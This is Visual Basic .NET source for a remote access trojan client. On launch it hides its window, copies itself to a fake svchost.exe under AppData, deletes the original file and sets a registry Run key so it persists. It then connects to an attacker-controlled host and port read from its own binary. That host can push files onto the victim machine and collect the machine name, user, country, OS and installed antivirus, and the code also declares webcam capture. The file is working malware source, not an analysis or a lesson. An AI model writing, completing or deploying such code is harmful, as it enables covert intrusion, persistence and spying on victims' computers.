Imports System.Globalization
Imports System.IO
Imports System.Net, System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32


Public Class Form1

    Dim PersistThread As Thread
    Public alab As String
    Public WithEvents C As New SocketClient
    Public Yy As String = "|HACXXCODER|"
    Public HOST As String
    Public port As Integer
    Public name As String
    Public copyse As Boolean = 0

    Public sernam As String
    Public addtos As Boolean = 0
    Public StartupKey As String
    Public melts As Boolean = 0
    Public pw As String
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)

    Private makel As String
    Dim alaa(), text1, text2 As String
    Const spl = "abccba"
    Dim PictureBox1 As Windows.Forms.PictureBox
    Dim streamWebcam As Boolean = False
    Public loggg As String
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32

  

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose()
        alaa = Split(text1, spl)
        HOST = alaa(1)
        port = alaa(2)
        name = alaa(3)
        copyse = alaa(4)
        sernam = alaa(5)
        addtos = alaa(6)
        StartupKey = alaa(7)
        melts = alaa(8)
        pw = alaa(9)
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        If Not IO.Directory.Exists(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) Then
            IO.Directory.CreateDirectory(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
        End If

        Timer2.Start()
        
        If melts Then
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else

                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                End If
            End If
        End If
        If copyse Then
            If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else

                If File.Exists(Path.GetTempPath & sernam & ".exe") Then
                    Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                End If
            End If
        End If



        If addtos Then
            Try

                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch : End Try
        End If
    End Sub
#Region "Socket Events"
    Private Sub Connected() Handles C.Connected
    End Sub
    Private Sub Disconnected() Handles C.Disconnected

      
    End Sub
    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "tt"
                    C.Send("tt")
                Case "Upload"
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                        Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        C.Send("UploadFailed" & Yy & A(2))
                    End Try
                Case "UploadContinue"
                    Try
A:
                        Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        GoTo A
                    End Try
                Case "CancelUpload"
B:
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                    Catch
                        GoTo B
                    End Try
                Case "info"
                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName

                    C.Send("info" & Yy & country & Yy & name & Yy & pc & Yy & My.Computer.Info.OSFullName & Yy & getanti())
                Case "Uninstall"
                    Try
                        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                        PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()

                    Catch ex As Exception
                    End Try

                    End




            End Select
        Catch ex As Exception
        End Try

    End Sub
#End Region

 


    Private Sub Timer2_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If C.Statconnected = False Then
            C.Connect(HOST, port)
        End If
    End Sub

 
End Class
